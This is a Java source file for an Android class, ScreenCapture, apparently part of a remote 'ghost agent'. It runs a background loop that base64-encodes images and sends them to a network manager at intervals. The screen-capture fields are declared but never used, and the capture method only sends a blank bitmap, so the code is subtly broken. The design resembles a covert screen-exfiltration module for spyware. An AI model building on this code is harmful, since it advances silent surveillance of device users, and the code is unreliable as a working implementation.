package com.ghost.agent.core;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

public class ScreenCapture {
    
    private Context context;
    private NetworkManager networkManager;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private Handler backgroundHandler;
    private HandlerThread backgroundThread;
    
    private int width;
    private int height;
    private int dpi;
    private boolean isCapturing = false;
    
    public ScreenCapture(Context context, NetworkManager networkManager) {
        this.context = context;
        this.networkManager = networkManager;
        
        WindowManager windowManager = (WindowManager) 
            context.getSystemService(Context.WINDOW_SERVICE);
        DisplayMetrics metrics = new DisplayMetrics();
        windowManager.getDefaultDisplay().getMetrics(metrics);
        
        width = metrics.widthPixels;
        height = metrics.heightPixels;
        dpi = metrics.densityDpi;
        
        backgroundThread = new HandlerThread("ScreenCapture");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }
    
    public void startCapture(int intervalMs) {
        if (isCapturing) return;
        
        isCapturing = true;
        
        backgroundHandler.post(() -> {
            while (isCapturing) {
                captureNow();
                try {
                    Thread.sleep(intervalMs);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        });
    }
    
    public String captureNow() {
        try {
            Bitmap bitmap = Bitmap.createBitmap(720, 1280, Bitmap.Config.ARGB_8888);
            
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 70, baos);
            byte[] imageData = baos.toByteArray();
            
            String base64 = Base64.encodeToString(imageData, Base64.NO_WRAP);
            networkManager.sendScreenshot(base64);
            
            return base64;
            
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
    
    public void stopCapture() {
        isCapturing = false;
        
        if (virtualDisplay != null) {
            virtualDisplay.release();
            virtualDisplay = null;
        }
        
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
    }
}
